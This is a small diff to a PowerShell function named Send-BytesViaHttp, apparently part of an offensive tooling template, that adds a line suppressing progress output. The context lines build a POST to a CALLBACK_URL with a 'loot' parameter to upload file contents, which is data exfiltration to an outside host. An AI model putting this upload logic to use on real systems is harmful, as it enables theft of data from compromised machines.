@@ -494,6 +494,7 @@ function Send-BytesViaHttp {
     $prebody = [System.Text.Encoding]::UTF8.GetBytes($prebody)
     $postbody = [System.Text.Encoding]::UTF8.GetBytes($postbody)
 
+    $ProgressPreference = 'SilentlyContinue'
     $post_url = "$(${CALLBACK_URL})u?script"
     if ($LootId) { $post_url += "&loot=$LootId" }
     {{'Write-Debug "POSTing the file to $post_url..."'|debug}}
